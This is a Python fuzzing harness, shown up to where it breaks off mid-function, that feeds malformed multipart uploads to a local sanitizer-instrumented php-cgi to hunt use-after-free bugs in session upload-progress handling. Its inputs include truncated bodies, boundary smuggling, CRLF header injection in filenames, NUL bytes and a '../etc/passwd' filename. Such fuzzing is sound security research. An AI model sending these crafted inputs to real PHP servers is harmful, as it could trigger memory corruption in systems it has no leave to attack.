#!/usr/bin/env python3
"""
Offline multipart fuzzer for php-cgi session.upload_progress (php-src 8.5.10 ASAN).

Drives the CGI SAPI directly on stdin: no web server. Targets heap UAFs
(CVE-2026-109618 / CVE-2026-109619) in the session.upload_progress (rfc1867)
machinery. Seeded, systematic mutation families + Content-Length SHORTHAVE
(truncated bodies => SAPI abort mid-parse, prime UAF window).

Usage:
  python3 fuzz_harness.py sanity            # verify machinery engages
  python3 fuzz_harness.py fuzz [--seed N] [--budget N]
"""
import hashlib
import json
import os
import re
import subprocess
import sys
import time
import random

PHP_CGI = os.environ.get(
    "PHP_CGI",
    os.environ["ZERODAYS_ROOT"] + "/build_asan/sapi/cgi/php-cgi")
if not os.path.exists(PHP_CGI):
    PHP_CGI = os.environ["ZERODAYS_ROOT"] + "/install_asan/bin/php-cgi"

HUNT = "/tmp/opencode/realapps/side/hunt"
CRASHES = os.path.join(HUNT, "crashes")
SCRATCH = os.path.join(HUNT, "scratch")
DUMMY = os.path.join(HUNT, "dummy.php")
FINDINGS = os.path.join(HUNT, "fuzz_findings.md")

MAX_BODY = 8 * 1024 * 1024          # post_max_size default 8M
os.makedirs(CRASHES, exist_ok=True)
os.makedirs(SCRATCH, exist_ok=True)

RUNS_BUDGET = 250
PER_RUN_TIMEOUT = 5.0

run_counter = 0
hits = []            # list of dicts
family_table = []    # (family, label, status, dt, rc)

ENV_BASE = {
    "PATH": "/usr/bin:/bin",
    "HOME": SCRATCH,
    "REDIRECT_STATUS": "200",
    "ASAN_OPTIONS": "detect_leaks=0",
    "REQUEST_METHOD": "POST",
    "SCRIPT_FILENAME": DUMMY,
}

# sid MUST be 8 chars alnum (long/invalid sid silently disables machinery)
DEFAULT_SID = "sess1234"

PHP_ARGS = [
    "-n",
    "-d", "session.upload_progress.enabled=1",
    "-d", "session.upload_progress.cleanup=1",
    "-d", "session.upload_progress.min_freq=0",
    "-d", "session.save_path=" + SCRATCH,
    "-d", "html_errors=0",
    "-d", "display_errors=0",
    "-d", "log_errors=0",
    "-d", "cgi.force_redirect=0",
]

BND = b"Zq7fb18xKk"
PAD2M = (b"ABCDEFGHIJKLMNOPQRSTUVWXYZ012345" * 65536)[:2 * 1024 * 1024]
PAD1M = PAD2M[:1024 * 1024]

ASAN_PAT = re.compile(
    r"ERROR: AddressSanitizer: ([a-zA-Z-]+)|"
    r"AddressSanitizer: SEGV|"
    r"deadly signal|Segmentation fault")


def build_mp(fields, files, boundary, close=True, final_crlf=True):
    """fields: [(name, value)]; files: [(name, filename, content)] -> body"""
    parts = []
    for name, value in fields:
        parts.append(b"--" + boundary + b"\r\n"
                     b"Content-Disposition: form-data; name=\""
                     + name + b"\"\r\n\r\n" + value + b"\r\n")
    for name, filename, content in files:
        parts.append(b"--" + boundary + b"\r\n"
                     b"Content-Disposition: form-data; name=\""
                     + name + b"\"; filename=\"" + filename
                     + b"\"\r\n\r\n" + content + b"\r\n")
    body = b"".join(parts)
    if close:
        body += b"--" + boundary + b"--" + (b"\r\n" if final_crlf else b"")
    return body


def detect(errtxt, rc):
    m = ASAN_PAT.search(errtxt)
    if m:
        return m.group(0)
    if rc in (-11, -6, -4, -7, 134, 139, 138):
        return "signal:%d" % rc
    return None


def run_case(body, boundary, sid, timeout=PER_RUN_TIMEOUT, content_length=None,
             env_extra=None):
    """Run one request. Returns (rc, out, err, env_used)."""
    env = dict(ENV_BASE)
    if env_extra:
        env.update(env_extra)
    env["CONTENT_TYPE"] = "multipart/form-data; boundary=" + \
        boundary.decode("latin1")
    env["CONTENT_LENGTH"] = str(len(body) if content_length is None
                                else content_length)
    env["HTTP_COOKIE"] = "PHPSESSID=" + sid
    try:
        p = subprocess.run([PHP_CGI] + PHP_ARGS, input=body,
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           env=env, timeout=timeout)
        rc, out, err = p.returncode, p.stdout, p.stderr
    except subprocess.TimeoutExpired as e:
        rc, out, err = -99, (e.stdout or b""), (e.stderr or b"")
    return rc, out, err, env


def save_hit(name, body, rc, out, err, env, sha):
    slug = re.sub(r"[^A-Za-z0-9_-]+", "_", sha)[:24]
    d = os.path.join(CRASHES, slug)
    os.makedirs(d, exist_ok=True)
    with open(os.path.join(d, "body.bin"), "wb") as f:
        f.write(body)
    with open(os.path.join(d, "asan.log"), "wb") as f:
        f.write(err)
    with open(os.path.join(d, "stdout.bin"), "wb") as f:
        f.write(out)
    meta = {
        "name": name,
        "argv": [PHP_CGI] + PHP_ARGS,
        "env": env,
        "exit_code": rc,
        "body_len": len(body),
        "signature": sha,
    }
    with open(os.path.join(d, "meta.json"), "w") as f:
        json.dump(meta, f, indent=2)
    return d


def case(fam, name, body, boundary=BND, sid=DEFAULT_SID, content_length=None,
         timeout=PER_RUN_TIMEOUT, env_extra=None):
    """Execute + classify one case. Returns (status, out, err, sig)."""
    global run_counter
    if run_counter >= RUNS_BUDGET:
        return ("skipped-budget", b"", b"", None)
    run_counter += 1
    t0 = time.time()
    rc, out, err, env = run_case(body, boundary, sid, timeout=timeout,
                                 content_length=content_length,
                                 env_extra=env_extra)
    dt = time.time() - t0
    ashit = detect(err.decode("utf-8", "replace"), rc)
    status = "hit" if ashit else ("timeout" if rc == -99 else
                                  ("other" if rc not in (0, 1, 2) else "ok"))
    txt = out.decode("utf-8", "replace")
    if "No input file specified" in txt:
        status = "no-script"
    lines = out.decode("utf-8", "replace").splitlines()
    family_table.append((fam, name, status, "{}s".format(round(dt, 2)), rc))
    if ashit:
        sha = ashit
        mm = re.search(r"ERROR: AddressSanitizer:.*$", err.decode(
            "utf-8", "replace"), re.M)
        if mm:
            sha = mm.group(0)
        d = save_hit(fam + "/" + name, body, rc, out, err, env, sha)
        hits.append({"fam": fam, "name": name, "sha": sha, "dir": d,
                     "rc": rc, "sig": ashit})
    return status, out, err, ashit


def sid_for(label):
    return "s" + hashlib.sha1(label.encode()).hexdigest()[:7]


# ---------------------------------------------------------------- families



def fam_seed():
    out = []
    for k in (1, 2, 3):
        fields = [(b"PHP_SESSION_UPLOAD_PROGRESS", sid_for("seed%d" % k).encode()),
                  (b"MAX_FILE_SIZE", b"102400")]
        files = [(b"f%d" % i, b"Aa63.bin" if i else b"f%d.bin" % i,
                  os.urandom(300) if i else b"") for i in range(k)]
        out.append(("seed", "seed_f%d" % k, build_mp(fields, files, BND),
                    BND, None))
    fields = [(b"PHP_SESSION_UPLOAD_PROGRESS", sid_for("det").encode()),
              (b"MAX_FILE_SIZE", b"1024000")]
    files = [(b"up1", b"file.txt", b"X" * 1000)]
    out.append(("seed", "seed_det", build_mp(fields, files, BND), BND, None))
    return out


def fam_filename():
    out = []
    lens = [0, 1, 2, 3, 9, 63, 255, 256, 1000, 4095, 65535, 131072, 1048576,
            2 * 1024 * 1024]
    for L in lens:
        if L > MAX_BODY - 4096:
            continue
        name = b"A" * L
        files = [(b"p1", name, b"Q" * 64)]
        fields = [(b"PHP_SESSION_UPLOAD_PROGRESS", sid_for("fn%d" % L).encode()),
                  (b"MAX_FILE_SIZE", b"102400")]
        out.append(("filename", "fnlen_%d" % L,
                    build_mp(fields, files, BND), BND, None))
    nasty = [b"o'reilly\"x", b"a\\b", b"c\nd", b"e\rf", b"g%h", b"../etc/passwd",
             b"upload_progress_x", b"..\\..\\win", b"\xc3\xa9\xe6\x97\xa5",
             b"A" * 63 + b'"']
    for i, nm in enumerate(nasty):
        files = [(b"p1", nm + b".bin", b"Q" * 200)]
        fields = [(b"PHP_SESSION_UPLOAD_PROGRESS", sid_for("fnz%d" % i).encode()),
                  (b"MAX_FILE_SIZE", b"102400")]
        out.append(("filename", "fnchar_%d" % i,
                    build_mp(fields, files, BND), BND, None))
    return out


def fam_parts():
    out = []
    for n in range(1, 27):
        fields = [(b"PHP_SESSION_UPLOAD_PROGRESS", sid_for("np%d" % n).encode()),
                  (b"MAX_FILE_SIZE", b"102400")]
        files = [(b"p%d" % i, b"F%d.bin" % i, b"z" * 40) for i in range(n)]
        out.append(("parts", "parts_%02d" % n, build_mp(fields, files, BND),
                    BND, None))
    return out


def fam_dupprog():
    out = []
    for k in (2, 3, 5, 10):
        chunks = []
        pv = sid_for("dup%d" % k).encode()
        for i in range(k):
            chunks.append(b"--" + BND + b"\r\nContent-Disposition: form-data; "
                          b"name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n"
                          + pv + b"\r\n")
            chunks.append(b"--" + BND + b"\r\nContent-Disposition: form-data; "
                          b"name=\"f%d\"; filename=\"z%d.bin\"\r\n\r\nw\r\n"
                          % (i, i))
        out.append(("dupprog", "dupprog_%02d" % k, b"".join(chunks)
                    + b"--" + BND + b"--\r\n", BND, None))
    ch = [b"--" + BND + b"\r\nContent-Disposition: form-data; "
          b"name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n"
          + sid_for("dpx").encode() + b"\r\n",
          b"--" + BND + b"\r\nContent-Disposition: form-data; "
          b"name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\nzzzzzzzz\r\n"]
    out.append(("dupprog", "dupprog_mixed", b"".join(ch) + b"--" + BND
                + b"--\r\n", BND, None))
    return out


def fam_mfs():
    out = []
    vals = [b"0", b"-1", b"999999999999", b"2147483648",
            b"9223372036854775807", b"garbage", b"", b"-9223372036854775808"]
    for i, v in enumerate(vals):
        files = [(b"f1", b"a.bin", PAD1M), (b"f2", b"b.bin", PAD1M)]
        fields = [(b"MAX_FILE_SIZE", v),
                  (b"PHP_SESSION_UPLOAD_PROGRESS", sid_for("mfs%d" % i).encode())]
        lbl = v.decode() or "nul"
        out.append(("mfs", "mfs_%d_%s" % (i, re.sub(r"[^0-9-]", "", lbl) or lbl),
                    build_mp(fields, files, BND), BND, None))
    return out


def fam_bdry():
    out = []
    BD = b"BOUNDARYTOK"
    sid = sid_for("breuse").encode()
    body = (b"--" + BD + b"\r\nContent-Disposition: form-data; name=\""
            + BD + b"\"\r\n\r\n" + sid + b"\r\n"
            b"--" + BD + b"\r\nContent-Disposition: form-data; name=\""
            + BD + b"\"; filename=\"" + BD + b"\"\r\n\r\nQ\r\n"
            b"--" + BD + b"--\r\n")
    out.append(("bdry", "bdry_names", body, BD, None))
    smuggle = (b"--" + BD + b"\r\n\x00\r\n--" + BD + b"--\r\n"
               b"--" + BD + b"\r\nContent-Disposition: form-data; "
               b"name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n" + sid + b"\r\n"
               b"--" + BD + b"--\r\n")
    out.append(("bdry", "bdry_smuggle", smuggle, BD, None))
    inj = (b"--" + BD + b"\r\nContent-Disposition: form-data; name=\"f\"; "
           b"filename=\"x.bin\r\nContent-Disposition: form-data; "
           b"name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n" + sid + b"\r\n"
           b"--" + BD + b"--\r\n")
    out.append(("bdry", "bdry_inj", inj, BD, None))
    out.append(("bdry", "bdry_long", build_mp(
        [(b"PHP_SESSION_UPLOAD_PROGRESS", sid)],
        [(b"p1", b"B" * 120, b"C" * 50)], b"B" * 120),
        b"B" * 120, None))
    return out


def fam_empties():
    out = []
    sid = DEFAULT_SID.encode()
    out.append(("empties", "empty_file_content",
                build_mp([(b"PHP_SESSION_UPLOAD_PROGRESS", sid)],
                         [(b"f1", b"a.bin", b""), (b"f2", b"b.bin", b"")],
                         BND), BND, None))
    out.append(("empties", "empty_filename",
                b"--" + BND + b"\r\nContent-Disposition: form-data; "
                b"name=\"p1\"; filename=\"\"\r\n\r\nQ\r\n"
                b"--" + BND + b"--\r\n", BND, None))
    out.append(("empties", "no_filename_attr",
                b"--" + BND + b"\r\nContent-Disposition: form-data; "
                b"name=\"p1\"\r\n\r\nQ\r\n" + b"--" + BND + b"--\r\n",
                BND, None))
    out.append(("empties", "empty_name_field",
                b"--" + BND + b"\r\nContent-Disposition: form-data; name=\"\"\r\n\r\nv\r\n",
                BND, None))
    out.append(("empties", "empty_progress_value",
                build_mp([(b"PHP_SESSION_UPLOAD_PROGRESS", b"")],
                         [(b"f1", b"e.bin", b"Q" * 100)], BND), BND, None))
    out.append(("empties", "no_headers_part",
                b"--" + BND + b"\r\n\r\nZZ\r\n" + b"--" + BND + b"--\r\n",
                BND, None))
    out.append(("empties", "empty_body", b"", BND, None))
    return out


def fam_noclose():
    out = []
    pv = sid_for("nc").encode()
    hdr1 = (b"--" + BND + b"\r\nContent-Disposition: form-data; "
            b"name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n" + pv + b"\r\n")
    f1 = (b"--" + BND + b"\r\nContent-Disposition: form-data; name=\"f1\"; "
          b"filename=\"a.bin\"\r\n\r\n" + b"Z" * 5000 + b"\r\n")
    hdr2 = (b"--" + BND + b"\r\nContent-Disposition: form-data; "
            b"name=\"MAX_FILE_SIZE\"\r\n\r\n102400\r\n")
    f2 = (b"--" + BND + b"\r\nContent-Disposition: form-data; name=\"f2\"; "
          b"filename=\"b.bin\"\r\n\r\n" + b"Y" * 5000 + b"\r\n")
    out.append(("noclose", "noclose_none", hdr1 + f1 + hdr2 + f2, BND, None))
    out.append(("noclose", "noclose_after_content", f1.rstrip(b"\r\n"), BND,
                None))
    out.append(("noclose", "noclose_dashonly",
                hdr1 + f1 + hdr2 + f2 + b"--" + BND + b"-", BND, None))
    out.append(("noclose", "noclose_undash",
                hdr1 + f1 + hdr2 + f2 + b"--" + BND + b"\r\n", BND, None))
    return out


def fam_dupcd():
    out = []
    sid = sid_for("dupcd").encode()
    b1 = (b"--" + BND + b"\r\n"
          b"Content-Disposition: form-data; name=\"f1\"; filename=\"one.bin\"\r\n"
          b"Content-Disposition: form-data; name=\"p2\"; filename=\"two.bin\"\r\n"
          b"\r\nQQ\r\n" + b"--" + BND + b"--\r\n")
    out.append(("dupcd", "dupcd_file", b1, BND, None))
    b2 = (b"--" + BND + b"\r\n"
          b"Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n"
          b"Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n"
          b"\r\n999\r\n" + b"--" + BND + b"--\r\n")
    out.append(("dupcd", "dupcd_fields", b2, BND, None))
    b3 = (b"--" + BND + b"\r\n"
          b"content-disposition: FORM-DATA; NAME=\"f3\"; FILENAME=\"three.bin\"\r\n"
          b"Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"; "
          b"filename=\"x\"\r\n\r\n" + sid + b"\r\n"
          b"--" + BND + b"--\r\n")
    out.append(("dupcd", "dupcd_case", b3, BND, None))
    b4 = (b"--" + BND + b"\r\n"
          b"Content-Disposition: form-data; name=\"f4\"; filename=\"a.bin\"\r\n"
          b"Content-Disposition: form-data; name=\"f4\"; filename=\"b.bin\"\r\n"
          b"\r\nQQ\r\n" + b"--" + BND + b"--\r\n")
    out.append(("dupcd", "dupcd_samename", b4, BND, None))
    return out


def fam_crlf():
    out = []
    pv = sid_for("crlf").encode()
    hdr1 = (b"--" + BND + b"\r\nContent-Disposition: form-data; "
            b"name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n" + pv + b"\r\n")
    f1 = (b"--" + BND + b"\r\nContent-Disposition: form-data; name=\"f1\"; "
          b"filename=\"a.bin\"\r\n\r\n" + b"Z" * 1000 + b"\r\n")
    out.append(("crlf", "crlf_lfonly_all",
                hdr1.replace(b"\r\n", b"\n") + f1.replace(b"\r\n", b"\n")
                + b"--" + BND + b"--\r\n", BND, None))
    out.append(("crlf", "crlf_lone_cr",
                b"--" + BND + b"\r\nContent-Disposition: form-data; "
                b"name=\"f1\"; filename=\"a.bin\"\r\n\r\nC\r\r\nD\r\n"
                + b"--" + BND + b"--\r\n", BND, None))
    out.append(("crlf", "crlf_double",
                b"--" + BND + b"\r\n\r\r\nContent-Disposition: form-data; "
                b"name=\"f1\"\r\n\r\nQ\r\n" + b"--" + BND + b"--\r\n",
                BND, None))
    out.append(("crlf", "crlf_close_nocrlf", hdr1 + f1 + b"--" + BND + b"--",
                BND, None))
    out.append(("crlf", "crlf_leading_space",
                b" --" + BND + b"\r\nContent-Disposition: form-data; "
                b"name=\"f1\"\r\n\r\nQ\r\n" + b" --" + BND + b"--\r\n",
                BND, None))
    out.append(("crlf", "crlf_boundary_crlfcrlf",
                b"--" + BND + b"\r\n\r\n\r\nContent-Disposition: form-data; "
                b"name=\"f1\"; filename=\"a.bin\"\r\n\r\nQ\r\n"
                + b"--" + BND + b"--\r\n", BND, None))
    return out


def fam_inter():
    sid = sid_for("inter").encode()
    mk = lambda nm, fn, c: (b"--" + BND
                            + b"\r\nContent-Disposition: form-data; name=\""
                            + nm + b"\"; filename=\"" + fn
                            + b"\"\r\n\r\n" + c + b"\r\n")
    fld = lambda n, v: (b"--" + BND
                        + b"\r\nContent-Disposition: form-data; name=\""
                        + n + b"\"\r\n\r\n" + v + b"\r\n")
    out = []
    out.append(("inter", "inter_prog_last",
                mk(b"f1", b"a.bin", b"Z" * 500) + mk(b"f2", b"b.bin",
                                                     b"Y" * 500)
                + fld(b"PHP_SESSION_UPLOAD_PROGRESS", sid)
                + b"--" + BND + b"--\r\n", BND, None))
    out.append(("inter", "inter_prog_mid",
                mk(b"f1", b"a.bin", b"Z" * 500)
                + fld(b"PHP_SESSION_UPLOAD_PROGRESS", sid)
                + mk(b"f2", b"b.bin", b"Y" * 500) + b"--" + BND + b"--\r\n",
                BND, None))
    out.append(("inter", "inter_prog_both_ends",
                fld(b"PHP_SESSION_UPLOAD_PROGRESS", sid)
                + mk(b"f1", b"a.bin", b"Z" * 500)
                + fld(b"PHP_SESSION_UPLOAD_PROGRESS", sid)
                + b"--" + BND + b"--\r\n", BND, None))
    return out


def fam_shorthave(rng):
    out = []
    pv = sid_for("sh").encode()
    f1 = (b"--" + BND + b"\r\nContent-Disposition: form-data; name=\"f1\"; "
          b"filename=\"a.bin\"\r\n\r\n" + PAD1M + b"\r\n")
    f2 = (b"--" + BND + b"\r\nContent-Disposition: form-data; name=\"f2\"; "
          b"filename=\"b.bin\"\r\n\r\n" + PAD1M + b"\r\n")
    hdr1 = (b"--" + BND + b"\r\nContent-Disposition: form-data; "
            b"name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n" + pv + b"\r\n")
    hdr2 = (b"--" + BND + b"\r\nContent-Disposition: form-data; "
            b"name=\"MAX_FILE_SIZE\"\r\n\r\n102400\r\n")
    full = hdr1 + hdr2 + f1 + f2 + b"--" + BND + b"--\r\n"
    for fr in (0.02, 0.05, 0.1, 0.2, 0.35, 0.5, 0.6, 0.7, 0.75, 0.8, 0.9,
               0.95, 0.97, 0.99):
        cut = max(1, int(len(full) * fr))
        out.append(("shorthave", "shorthave_%.2f" % fr, full[:cut], BND,
                    len(full)))
    for off in (1, len(full) - 1, len(full) - 2, len(full) - 16,
                len(full) - 64, len(full) - 256, len(hdr1) - 1, len(hdr1),
                len(hdr1 + hdr2), len(hdr1 + hdr2) + 1):
        cut = max(1, min(off, len(full) - 1))
        out.append(("shorthave", "shorthave_off%d" % cut, full[:cut], BND,
                    len(full)))
    for i in range(4):
        cut = rng.randint(64, len(full) - 1)
        out.append(("shorthave", "shorthave_rnd%d" % i, full[:cut], BND,
                    len(full)))
    full2 = hdr1 + hdr1 + hdr2 + f1 + f2 + b"--" + BND + b"--\r\n"
    for fr in (0.1, 0.3, 0.6, 0.9):
        cut = max(1, int(len(full2) * fr))
        out.append(("shorthave", "shorthave_dupprog_%.1f" % fr, full2[:cut],
                    BND, len(full2)))
    cut = len(b"--" + BND + b"\r\n") + 40
    out.append(("shorthave", "shorthave_midhdr", full[:cut], BND, len(full)))
    return out


def fam_postmax():
    out = []
    pv = sid_for("px").encode()
    target = 8 * 1024 * 1024
    probe = build_mp([(b"PHP_SESSION_UPLOAD_PROGRESS", pv),
                      (b"MAX_FILE_SIZE", b"1")],
                     [(b"f1", b"a.bin", b"P")], BND)
    n = target - (len(probe) - 1)
    n = max(1, n)
    body = build_mp([(b"PHP_SESSION_UPLOAD_PROGRESS", pv),
                     (b"MAX_FILE_SIZE", b"1")],
                    [(b"f1", b"a.bin", b"P" * n)], BND)
    out.append(("postmax", "postmax_exact_%d" % len(body), body, BND, None))
    tail = len(b"--" + BND + b"--\r\n")
    out.append(("postmax", "postmax_noclose", body[:-tail], BND, len(body)))
    return out


def fam_samename():
    out = []
    pv = sid_for("sn").encode()
    for k in (2, 4, 8):
        files = [(b"p1", b"same.bin", b"Q" * 200) for _ in range(k)]
        out.append(("samename", "samename_dup%d" % k,
                    build_mp([(b"PHP_SESSION_UPLOAD_PROGRESS", pv)], files,
                             BND), BND, None))
    for k in (2, 8):
        files = [(b"p1", b"same.bin", (b"Q" * 87500 if k == 8 else PAD1M))
                 for _ in range(k)]
        out.append(("samename", "samename_dup%d_%s" % (k, "1M" if k == 2
                                                       else "512K"),
                    build_mp([(b"PHP_SESSION_UPLOAD_PROGRESS", pv)], files,
                             BND), BND, None))
    return out


def fam_combo(rng):
    out = []
    base_fields = [(b"MAX_FILE_SIZE", b"102400"),
                   (b"PHP_SESSION_UPLOAD_PROGRESS", sid_for("combo").encode())]
    for i in range(24):
        k = rng.randint(2, 26)
        bigname = rng.random() < 0.4
        files = [(b"f%d" % j,
                  (b"A" * rng.choice([0, 63, 255, 65535, 200000])) if bigname
                  else b"F%d.bin" % j,
                  b"z" * 200) for j in range(k)]
        body = build_mp(base_fields, files, BND)
        cl = None
        if rng.random() < 0.5:
            cl = max(1, int(len(body) * rng.uniform(0.05, 0.99)))
        out.append(("combo", "combo%d" % i, body, BND, cl))
    return out


def fam_phase2(rng):
    """Deeper targeted interplays; appended after phase 1 sweep."""
    out = []
    pv = sid_for("p2").encode()

    def hdr(name, val):
        return (b"--" + BND + b"\r\nContent-Disposition: form-data; name=\""
                + name + b"\"\r\n\r\n" + val + b"\r\n")

    def multipart(nm, fn, c):
        return (b"--" + BND + b"\r\nContent-Disposition: form-data; name=\""
                + nm + b"\"; filename=\"" + fn + b"\"\r\n\r\n" + c + b"\r\n")

    # --- SHORTHAVE matrix on diversified bodies -------------------------
    def sh(base, tag, fr_pick):
        full = base
        n = len(full)
        for fr in fr_pick:
            cut = max(1, int(n * fr))
            out.append(("p2shorthave", tag + ("_%.3f" % fr), full[:cut], BND,
                        n))
        for extra in (n - 1, n - 2, n - 3, n - 4, n - 9):
            cut = max(1, min(extra, n - 1))
            out.append(("p2shorthave", tag + ("_off%d" % cut), full[:cut],
                        BND, n))
        return

    prog_first = (hdr(b"PHP_SESSION_UPLOAD_PROGRESS", pv) + hdr(b"MAX_FILE_SIZE", b"102400")
                  + multipart(b"f1", b"a.bin", PAD1M) + multipart(b"f2", b"b.bin", PAD1M)
                  + b"--" + BND + b"--\r\n")
    sh(prog_first, "p2sh_prog_first", (0.03, 0.08, 0.5, 0.85, 0.995))
    prog_last = (multipart(b"f1", b"a.bin", PAD1M) + multipart(b"f2", b"b.bin", PAD1M)
                 + hdr(b"PHP_SESSION_UPLOAD_PROGRESS", pv)
                 + b"--" + BND + b"--\r\n")
    sh(prog_last, "p2sh_prog_last", (0.03, 0.35, 0.5, 0.6, 0.7, 0.85, 0.995))
    many_files = hdr(b"PHP_SESSION_UPLOAD_PROGRESS", pv) + hdr(b"MAX_FILE_SIZE", b"102400")
    for i in range(26):
        many_files += multipart(b"p%d" % i, b"f%d.bin" % i, b"Zz" * 2000)
    many_files += b"--" + BND + b"--\r\n"
    for fr in (0.05, 0.3, 0.5, 0.7, 0.9, 0.99, 0.998):
        cut = max(1, int(len(many_files) * fr))
        out.append(("p2shorthave", "p2sh_many_%g" % fr, many_files[:cut], BND,
                    len(many_files)))
    bigname = (hdr(b"PHP_SESSION_UPLOAD_PROGRESS", pv)
               + multipart(b"f1", b"A" * 1048576, b"Q" * 64)
               + multipart(b"f2", b"b.bin", b"Q" * 64) + b"--" + BND + b"--\r\n")
    for fr in (0.05, 0.2, 0.4, 0.6, 0.8, 0.95, 0.999):
        cut = max(1, int(len(bigname) * fr))
        out.append(("p2shorthave", "p2sh_bigname_%g" % fr, bigname[:cut], BND,
                    len(bigname)))
    # exactly at boundary starts
    for pos_txt in (b"--" + BND + b"\r\nContent-Disposition: form-data; name=\"f2\"",):
        idx = prog_first.find(pos_txt)
        out.append(("p2shorthave", "p2sh_atpart2hdr", prog_first[:idx], BND,
                    len(prog_first)))
    idx = prog_first.find(b"--" + BND + b"--")
    out.append(("p2shorthave", "p2sh_atclosing", prog_first[:idx], BND,
                len(prog_first)))
    out.append(("p2shorthave", "p2sh_crlf_half",
                prog_first[:idx + 1], BND, len(prog_first)))

    # --- cancel_upload interplay (MAX_FILE_SIZE=0 => cancel path) --------
    canc_body = (hdr(b"MAX_FILE_SIZE", b"0")
                 + multipart(b"f1", b"a.bin", PAD1M)
                 + hdr(b"PHP_SESSION_UPLOAD_PROGRESS", pv)
                 + multipart(b"f2", b"b.bin", PAD1M)
                 + multipart(b"f3", b"c.bin", PAD1M)
                 + b"--" + BND + b"--\r\n")
    out.append(("p2cancel", "cancel_inter", canc_body, BND, None))
    n = len(canc_body)
    for fr in (0.4, 0.55, 0.7, 0.85, 0.95):
        out.append(("p2cancel", "cancel_sh_%g" % fr, canc_body[:int(n * fr)],
                    BND, n))
    canc2 = (multipart(b"f1", b"a.bin", PAD1M) + hdr(b"MAX_FILE_SIZE", b"-1")
             + multipart(b"f2", b"b.bin", PAD1M)
             + hdr(b"PHP_SESSION_UPLOAD_PROGRESS", pv) + b"--" + BND + b"--\r\n")
    out.append(("p2cancel", "cancel_neg_inter", canc2, BND, None))

    # --- progress VALUE length ladder ------------------------------------
    for L in (1, 7, 8, 9, 15, 16, 17, 31, 32, 33, 63, 64, 65, 127, 128, 129,
              255, 256, 257, 1023, 1024, 1025, 65535, 65536):
        val = b"v" * L
        out.append(("p2keylen", "keylen_%d" % L,
                    hdr(b"PHP_SESSION_UPLOAD_PROGRESS", val)
                    + multipart(b"f1", b"a.bin", b"Q" * 3000)
                    + b"--" + BND + b"--\r\n", BND, None))

    # --- content containing boundary token -------------------------------
    tok_in = (hdr(b"PHP_SESSION_UPLOAD_PROGRESS", pv)
              + multipart(b"f1", b"a.bin",
                          b"A" * 100 + b"\r\n--" + BND + b"\r\nContent-Disposition: form-data; name=\"evil\"; filename=\"x\"\r\n\r\n" + b"B" * 100 + b"\r\n--" + BND + b"--\r\n" + b"C" * 100)
              + multipart(b"f2", b"b.bin", b"S" * 300)
              + b"--" + BND + b"--\r\n")
    out.append(("p2tok", "tok_in_content", tok_in, BND, None))
    resep = (hdr(b"PHP_SESSION_UPLOAD_PROGRESS", pv)
             + multipart(b"f1", b"a.bin",
                         b"A" * 100 + b"\r\n--" + BND + b"--\r\n" + b"B" * 100)
             + b"--" + BND + b"--\r\n")
    out.append(("p2tok", "tok_early_close", resep, BND, None))

    # --- NUL bytes in filename / name ------------------------------------
    out.append(("p2nul", "nul_filename",
                b"--" + BND + b"\r\nContent-Disposition: form-data; name=\"f1\"; filename=\"a\x00.bin\"\r\n\r\nQ\r\n"
                + hdr(b"PHP_SESSION_UPLOAD_PROGRESS", pv)
                + b"--" + BND + b"--\r\n", BND, None))
    out.append(("p2nul", "nul_name",
                b"--" + BND + b"\r\nContent-Disposition: form-data; name=\"f\x001\"; filename=\"a.bin\"\r\n\r\nQ\r\n"
                + hdr(b"PHP_SESSION_UPLOAD_PROGRESS", pv)
                + b"--" + BND + b"--\r\n", BND, None))
    out.append(("p2nul", "nul_progressval",
                hdr(b"PHP_SESSION_UPLOAD_PROGRESS", pv + b"\x00tail")
                + multipart(b"f1", b"a.bin", b"Q" * 2000)
                + b"--" + BND + b"--\r\n", BND, None))

    # --- CRLF injection in filename ---------------------------------------
    out.append(("p2crlfn", "crlf_in_filename",
                b"--" + BND + b"\r\nContent-Disposition: form-data; name=\"f1\"; filename=\"x.bin\"\r\nContent-Disposition: form-data\r\n\r\nQQ\r\n"
                + hdr(b"PHP_SESSION_UPLOAD_PROGRESS", pv)
                + multipart(b"f2", b"b.bin", b"S" * 500)
                + b"--" + BND + b"--\r\n", BND, None))

    # --- cross max_file_uploads + shorthave on 26 files -------------------
    over = many_files[:-len(b"--" + BND + b"--\r\n")]  # no closing boundary
    for fr in (0.2, 0.6, 0.9):
        cut = max(1, int(len(over) * fr))
        out.append(("p2shorthave", "p2sh_noclose26_%g" % fr, over[:cut], BND,
                    len(over)))

    # --- mixed maximizing state mutations ---------------------------------
    mix1 = (hdr(b"MAX_FILE_SIZE", b"0")
            + hdr(b"PHP_SESSION_UPLOAD_PROGRESS", pv)
            + multipart(b"f1", b"A" * 65535, b"Q" * 50000)
            + hdr(b"PHP_SESSION_UPLOAD_PROGRESS", pv)
            + multipart(b"f2", b"b.bin", b"")
            + hdr(b"PHP_SESSION_UPLOAD_PROGRESS", pv)
            + multipart(b"f3", b"c.bin", b"Q" * 100000)
            + b"--" + BND + b"--\r\n")
    out.append(("p2combo", "p2mix1", mix1, BND, None))
    for fr in (0.3, 0.55, 0.75, 0.9, 0.97):
        out.append(("p2combo", "p2mix1_sh_%g" % fr, mix1[:int(len(mix1) * fr)],
                    BND, len(mix1)))
    mix2 = (hdr(b"PHP_SESSION_UPLOAD_PROGRESS", b"v" * 260)
            + hdr(b"MAX_FILE_SIZE", b"garbage")
            + multipart(b"f1", b"same.bin", PAD1M)
            + multipart(b"f1", b"same.bin", PAD1M)
            + multipart(b"f1", b"same.bin", PAD1M)
            + b"--" + BND + b"--\r\n")
    out.append(("p2combo", "p2mix2", mix2, BND, None))

    # seeded random truncation of all earlier bodies (shortest-first boost)
    rng2 = random.Random(int(hashlib.sha1(str(seed_val).encode()).hexdigest()[:8], 16))
    for i in range(6):
        fam, name, base, b2, _cl = phase2_pool[i % len(phase2_pool)]
